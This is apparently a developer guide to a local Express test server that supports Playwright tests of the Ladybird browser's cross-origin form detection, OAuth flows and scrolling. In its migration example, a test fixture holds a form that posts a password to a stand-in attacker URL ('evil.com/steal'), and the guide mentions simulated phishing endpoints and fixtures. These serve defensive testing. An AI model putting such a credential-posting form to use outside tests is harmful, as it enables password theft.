# HTTP Test Server Guide

This document describes the local HTTP test server infrastructure for Ladybird Playwright tests.

## Overview

The HTTP test server provides a proper HTTP environment for testing features that require:
- **Real origins** (not opaque `data:` URLs)
- **Cross-origin scenarios** (FormMonitor, PolicyGraph, CORS)
- **HTTP headers and cookies**
- **Scrolling support** (not available with `data:` URLs)
- **Form submissions with real POST/GET requests**
- **OAuth/SSO flows**

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│ Playwright Test Runner                                      │
├─────────────────────────────────────────────────────────────┤
│ Auto-starts/stops servers via playwright.config.ts          │
└────────┬──────────────────────────────────┬─────────────────┘
         │                                  │
         ▼                                  ▼
┌─────────────────────┐          ┌─────────────────────┐
│ Test Server A       │          │ Test Server B       │
│ Port: 8080          │          │ Port: 8081          │
│ Origin A            │◄────────►│ Origin B            │
│ (Primary)           │          │ (Cross-origin)      │
└─────────────────────┘          └─────────────────────┘
         │                                  │
         └──────────────┬───────────────────┘
                        ▼
              ┌─────────────────────┐
              │ Static Fixtures     │
              │ fixtures/           │
              │ - forms/            │
              │ - navigation/       │
              │ - scroll tests      │
              └─────────────────────┘
```

### Origins

Three origins are available for cross-origin testing:

| Origin | URL | Purpose |
|--------|-----|---------|
| Origin A | `http://localhost:8080` | Primary test server |
| Origin B | `http://localhost:8081` | Secondary server (different port = different origin) |
| Origin C | `http://127.0.0.1:8080` | Same port, different host (also different origin) |

## Quick Start

### 1. Install Dependencies

```bash
cd /home/rbsmith4/ladybird/Tests/Playwright
npm install
```

This installs:
- `express` - HTTP server framework
- `cors` - Cross-origin resource sharing
- `concurrently` - Run multiple servers

### 2. Run Tests (Automatic Server Start)

```bash
# Servers start automatically with Playwright
npm test

# Or specific test suites
npm run test:p0
```

Playwright config automatically:
1. Starts both servers (ports 8080 and 8081)
2. Waits for them to be ready
3. Runs tests
4. Stops servers when done

### 3. Manual Server Start (Optional)

For development or debugging:

```bash
# Start primary server (port 8080)
npm run test-server

# Or start both servers
npm run servers

# Check server health
npm run server:health
```

### 4. Verify Server is Running

```bash
# Health check
curl http://localhost:8080/health

# View server home page
curl http://localhost:8080/

# Test form endpoint
curl -X POST http://localhost:8080/submit \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=secret"
```

## Using in Tests

### Basic Usage

Replace `data:` URLs with HTTP URLs:

```typescript
// Before (data: URL)
await page.goto('data:text/html,<h1>Test</h1>');

// After (HTTP URL)
await page.goto('http://localhost:8080/forms/legitimate-login.html');
```

### Cross-Origin Testing

```typescript
// FormMonitor: Cross-origin credential submission
test('cross-origin password submission', async ({ page }) => {
  // Load form from Origin A (port 8080)
  await page.goto('http://localhost:8080/forms/cross-origin-test.html');

  // Form submits to Origin B (port 8081) - different origin!
  await page.click('#submit-btn');

  // FormMonitor should detect cross-origin submission
  // and show security alert
});
```

### Scrolling Tests

```typescript
// Navigation: Anchor link scrolling
test('anchor navigation with scrolling', async ({ page }) => {
  // Load page with scrollable content
  await page.goto('http://localhost:8080/scroll-page.html');

  // Click anchor link
  await page.click('a[href="#target"]');

  // Verify scrolling occurred
  const scrollY = await page.evaluate(() => window.scrollY);
  expect(scrollY).toBeGreaterThan(1000);
});
```

### Form Submission

```typescript
// FormMonitor: Test real form POST
test('form submission with response', async ({ page }) => {
  await page.goto('http://localhost:8080/forms/legitimate-login.html');

  // Fill form
  await page.fill('#email', 'user@example.com');
  await page.fill('#password', 'mypassword');

  // Submit and wait for response
  const [response] = await Promise.all([
    page.waitForResponse(resp => resp.url().includes('/submit')),
    page.click('#submit-btn')
  ]);

  // Verify server received submission
  const data = await response.json();
  expect(data.received.email).toBe('user@example.com');
  expect(data.hasPasswordField).toBe(true);
});
```

### OAuth Flow

```typescript
// FormMonitor: Trusted OAuth relationship
test('oauth flow', async ({ page, context }) => {
  await page.goto('http://localhost:8080/forms/oauth-flow.html');

  // Submit to OAuth provider (cross-origin)
  const pagePromise = context.waitForEvent('page');
  await page.click('#submit-btn');

  // OAuth provider opens in new tab
  const oauthPage = await pagePromise;
  await oauthPage.waitForLoadState();

  // Verify OAuth page loaded
  await expect(oauthPage).toHaveURL(/authorize/);
});
```

## Available Endpoints

### Form Submission

| Endpoint | Method | Purpose | Example |
|----------|--------|---------|---------|
| `/submit` | POST | Generic form submission | FormMonitor tests |
| `/login` | POST | Same-origin login | Authentication tests |
| `/harvest` | POST | Simulated phishing | Cross-origin detection |

### OAuth Flow

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/oauth/authorize` | GET/POST | OAuth authorization |
| `/oauth/callback` | GET | OAuth callback |

### Navigation

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/redirect?status=302&url=...` | GET | HTTP redirects (301, 302, 307, 308) |
| `/slow-page?delay=3000` | GET | Slow loading page (timeout tests) |
| `/scroll-test` | GET | Scrollable content |

### Cookies & Sessions

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/set-cookie` | GET | Set test cookies |
| `/read-cookie` | GET | Read and display cookies |

### Utilities

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/health` | GET | Health check (returns JSON status) |
| `/` | GET | Server info and documentation |

## Static Fixtures

All files in `fixtures/` are served as static files:

```
fixtures/
├── forms/
│   ├── legitimate-login.html      # Same-origin login (no alert)
│   ├── oauth-flow.html            # OAuth/SSO cross-origin
│   ├── phishing-attack.html       # Malicious cross-origin
│   ├── data-harvesting.html       # Hidden field detection
│   └── cross-origin-test.html     # Cross-origin test (port 8080 → 8081)
├── scroll-page.html               # Scrolling and anchor navigation
└── navigation-test.html           # Navigation test scenarios
```

Access via:
```
http://localhost:8080/forms/legitimate-login.html
http://localhost:8080/scroll-page.html
```

## Server Configuration

### Environment Variables

| Variable | Default | Purpose |
|----------|---------|---------|
| `PORT` | 8080 | Server port |
| `NODE_ENV` | development | Environment mode |

### Playwright Config

See `playwright.config.ts`:

```typescript
webServer: [
  {
    command: 'node test-server.js',
    port: 8080,
    timeout: 10000,
    reuseExistingServer: !process.env.CI,
  },
  {
    command: 'PORT=8081 node test-server.js',
    port: 8081,
    timeout: 10000,
    reuseExistingServer: !process.env.CI,
  },
]
```

### Server Lifecycle

```
┌──────────────────────────────────────────────────────────────┐
│ 1. npx playwright test                                       │
└────────────────┬─────────────────────────────────────────────┘
                 │
                 ▼
┌──────────────────────────────────────────────────────────────┐
│ 2. Playwright checks if servers are running on 8080/8081    │
│    - If CI=true: Always start fresh                          │
│    - If CI=false: Reuse existing servers                     │
└────────────────┬─────────────────────────────────────────────┘
                 │
                 ▼
┌──────────────────────────────────────────────────────────────┐
│ 3. Start servers (if needed)                                 │
│    - node test-server.js (port 8080)                         │
│    - PORT=8081 node test-server.js (port 8081)               │
│    - Wait for health check (timeout: 10s)                    │
└────────────────┬─────────────────────────────────────────────┘
                 │
                 ▼
┌──────────────────────────────────────────────────────────────┐
│ 4. Run all tests                                             │
│    - Tests access http://localhost:8080 and :8081            │
└────────────────┬─────────────────────────────────────────────┘
                 │
                 ▼
┌──────────────────────────────────────────────────────────────┐
│ 5. Shutdown servers (if started by Playwright)               │
│    - Send SIGTERM                                            │
│    - Wait for graceful shutdown                              │
└──────────────────────────────────────────────────────────────┘
```

## Migration from data: URLs

### When to Use HTTP URLs

Use HTTP URLs when you need:
- ✅ **Cross-origin testing** - Different origins (FormMonitor, CORS)
- ✅ **Scrolling** - Page scrolling and anchor navigation
- ✅ **Real HTTP headers** - Cookies, Referer, Origin headers
- ✅ **Form submissions** - POST/GET with server responses
- ✅ **OAuth/redirect flows** - Multi-page flows

Keep `data:` URLs for:
- ✅ **Simple DOM tests** - Basic element rendering
- ✅ **Quick inline tests** - No need for separate file
- ✅ **Single-page tests** - No navigation required

### Migration Example

```typescript
// Before: data: URL
test('form submission', async ({ page }) => {
  const html = `
    <form action="https://evil.com/steal" method="POST">
      <input type="password" name="password" value="secret">
      <button type="submit">Submit</button>
    </form>
  `;
  await page.goto(`data:text/html,${encodeURIComponent(html)}`);

  // Problem: data: URLs have opaque origins
  // Cannot test real cross-origin scenarios
});

// After: HTTP URL
test('form submission', async ({ page }) => {
  // Load from HTTP server (has real origin)
  await page.goto('http://localhost:8080/forms/cross-origin-test.html');

  // Now has real origin: http://localhost:8080
  // Form action: http://localhost:8081/submit (different origin!)
  // FormMonitor can properly detect cross-origin submission
});
```

## Troubleshooting

### Server Won't Start

```bash
# Check if port is already in use
lsof -i :8080
lsof -i :8081

# Kill existing process
kill -9 <PID>

# Or use different port
PORT=9080 npm run test-server
```

### Tests Timeout

```bash
# Check server is running
curl http://localhost:8080/health

# Increase timeout in playwright.config.ts
webServer: {
  timeout: 30000,  // 30 seconds
}
```

### CORS Errors

The server is configured to allow all origins:
```javascript
app.use(cors({
  origin: '*',
  credentials: true
}));
```

If you still get CORS errors, check:
1. Browser security settings
2. Test is using correct origin
3. Server logs for errors

### Server Logs

```bash
# Server logs to console
npm run test-server

# Example output:
# ======================================================================
# Ladybird Test Server
# ======================================================================
# Port:        8080
# URL:         http://localhost:8080
# ======================================================================
# [2024-11-01T14:30:00.000Z] GET / - Origin: none
# [2024-11-01T14:30:05.123Z] POST /submit - Origin: http://localhost:8080
```

## Advanced Usage

### Multiple Test Servers

Run servers on different ports for complex scenarios:

```bash
# Terminal 1: Primary server
PORT=8080 node test-server.js

# Terminal 2: Secondary server
PORT=8081 node test-server.js

# Terminal 3: Third origin (different host)
PORT=8082 node test-server.js

# In tests, access via:
# - http://localhost:8080 (Origin A)
# - http://localhost:8081 (Origin B)
# - http://127.0.0.1:8082 (Origin C - different host)
```

### Custom Request Headers

```typescript
test('custom headers', async ({ page }) => {
  await page.goto('http://localhost:8080/forms/legitimate-login.html');

  // Add custom headers to requests
  await page.route('**/submit', route => {
    route.continue({
      headers: {
        ...route.request().headers(),
        'X-Test-Header': 'test-value',
      },
    });
  });

  await page.click('#submit-btn');
});
```

### Intercept Form Submissions

```typescript
test('intercept submission', async ({ page }) => {
  await page.goto('http://localhost:8080/forms/cross-origin-test.html');

  // Listen for form submission request
  const submissionPromise = page.waitForRequest(
    req => req.url().includes('/submit') && req.method() === 'POST'
  );

  await page.click('#submit-btn');

  const request = await submissionPromise;
  const postData = request.postDataJSON();

  expect(postData.password).toBe('secret123');
});
```

## Architecture Decisions

### Why Express?

1. **Simple** - Easy to set up and configure
2. **Flexible** - Easy to add custom endpoints
3. **Well-documented** - Extensive ecosystem
4. **Standard** - Widely used for HTTP testing

### Why Not Python http.server?

- ❌ Less flexible for custom endpoints
- ❌ Harder to parse POST data
- ❌ Limited middleware support

### Why Not Playwright's webServer Only?

Playwright's `webServer` config is used to **manage lifecycle** (start/stop), but we need Express for:
- Custom endpoints (form submission, OAuth)
- POST data parsing
- CORS configuration
- Response manipulation

### Why Multiple Server Instances?

To create **real cross-origin scenarios**:
```
http://localhost:8080 ≠ http://localhost:8081
(different port = different origin)
```

This allows testing:
- FormMonitor cross-origin detection
- CORS policies
- PolicyGraph trusted relationships
- Cookie/session behavior across origins

## Contributing

When adding new test scenarios:

1. **Add fixture** if testing complex HTML:
   ```bash
   # Create new fixture
   cat > fixtures/my-test.html << 'EOF'
   <!DOCTYPE html>
   <html>...</html>
   EOF
   ```

2. **Add endpoint** if testing server behavior:
   ```javascript
   // In test-server.js
   app.post('/my-endpoint', (req, res) => {
     res.json({ ... });
   });
   ```

3. **Update this doc** with new endpoints/usage

## References

- Playwright webServer: https://playwright.dev/docs/test-webserver
- Express documentation: https://expressjs.com/
- CORS: https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
- Same-origin policy: https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy
